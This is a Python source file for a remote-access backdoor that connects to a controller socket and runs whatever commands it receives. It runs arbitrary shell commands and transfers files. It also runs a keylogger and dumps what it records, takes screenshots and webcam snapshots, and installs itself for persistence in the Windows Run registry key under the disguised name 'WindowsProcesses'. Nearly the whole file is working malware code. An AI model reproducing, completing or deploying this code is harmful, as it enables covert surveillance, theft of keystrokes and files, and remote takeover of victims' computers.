from sys import platform
import socket
import json
import subprocess
import os
import pyautogui
import keylogger
import threading
import cv2
import datetime
import shutil
import sys
import base64
from winreg import *

class BackDoor():
    def __init__(self):
        self.regName = "WindowsProcesses"

    def shell(self):
        while True:
            command = self.recv_data()
            if command == "terminate":
                break

            elif command == "help":             # made own commands go here
                pass    
            
            elif command == "clear":
                pass

            elif command[:3] == "cd ":
                os.chdir(command[3:])

            elif command[:6] == "upload":
                self.download_file(command[7:])

            elif command[:8] == "download":
                self.upload_file(command[9:])


            elif command[:10] == "keylog_run":
                keylog = keylogger.KeyLogger()
                t = threading.Thread(target=keylog.start)
                t.start()
                self.reliable_send("[!] Keylogger successfully started.")
            elif command[:19] == "keylog_dumpcontents":
                logs = keylog.read_keylogs()
                self.reliable_send(logs)
            elif command[:16] == "keylog_terminate":
                keylog.terminate_keylogger()
                t.join()
                self.reliable_send("[!] Keylogger Terminated.")

            elif command[:11] == "persistence":
                copyName = command[12:].split(' ')
                copyName = copyName[0]
                #print(regName, file_loc)
                if sys.platform == "win32":  
                    file_loc = os.environ["APPDATA"] + "\\" + copyName

                    if not os.path.exists(file_loc):
                        shutil.copyfile(sys.executable, file_loc)     
                        reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                        SetValueEx(reg_key, self.regName, 0, REG_SZ, file_loc)
                        CloseKey(reg_key)
                        self.reliable_send("[!] Successfully Added Persistence")
                    else:
                        self.reliable_send("[!] Persistence Already Exists!")
                else:
                    self.reliable_send(f"Not supported on current system: {sys.platform}\n")

            elif command[:18] == "remove_persistence":
                try:
                    reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
                    DeleteValue(reg_key, self.regName)
                    CloseKey(reg_key)
                except FileNotFoundError:
                    self.reliable_send("[!] The program is not registered in startup")
                except WindowsError as e:
                    self.reliable_send(f"[!] Error removing value: {e}")
                else:
                    self.reliable_send("[!] Successfully removed persistence.")

            


            elif command[:10] == "screenshot":
                self.screenshot()
                self.upload_file("screen.png")
                os.remove("screen.png")
                
            elif command[:11] == "webcam_snap":
                self.webcamsnap_get()
                self.upload_file("cam.png")
                os.remove("cam.png")



            else:
                self.reliable_send(
                    subprocess.run(
                        ["powershell.exe", "-Command", "-"]
                        if sys.platform == "win32" 
                        else ["/bin/sh", "-x", "-s"], #unix
                        shell=False,
                        encoding="ISO-8859-1",
                        capture_output=True,
                        input=command,
                    ).stdout
                )
            


    def recv_data(self):
        data = ""
        while True:
            try:
                rawdata = s.recv(1024)
            except OSError:
                raise
            try:
                data = data + rawdata.decode().rstrip()
                return json.loads(data)

            except ValueError:
                continue
            


    def reliable_send(self, data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())



    def download_file(self, filename):
        with open(filename, "wb") as f:
            s.settimeout(1)
            chunk = s.recv(1024)
            while chunk: 
                f.write(chunk)
                try:
                    chunk = s.recv(1024)
                except socket.timeout as e:
                    break
                s.settimeout(None)
        

    def upload_file(self, filename):
        with open(filename, "rb") as f:
            print("1")
            data = f.read()
            print(len(data))
            s.send(data)
            print("2")


    def webcamsnap_get(self):
        try:
            cam = cv2.VideoCapture(0)
            r, frame = cam.read()
            if r != True:
                raise ValueError("Can't read frame")

            cv2.imwrite('cam.png', frame)
            cam.release()
            cv2.destroyAllWindows()
            #cv2.waitKey()
            
            
        except Exception as e: 
            self.reliable_send("[!] Couldn't get a snap of the webcam: {}.".format(e))

    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")






door = BackDoor()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # ipv4 and tcp/ip
s.connect(("127.0.0.1", 6969))
door.shell()



# determined issues SENDINd the data, thats why the server cant recieve it as there is no data to recieve.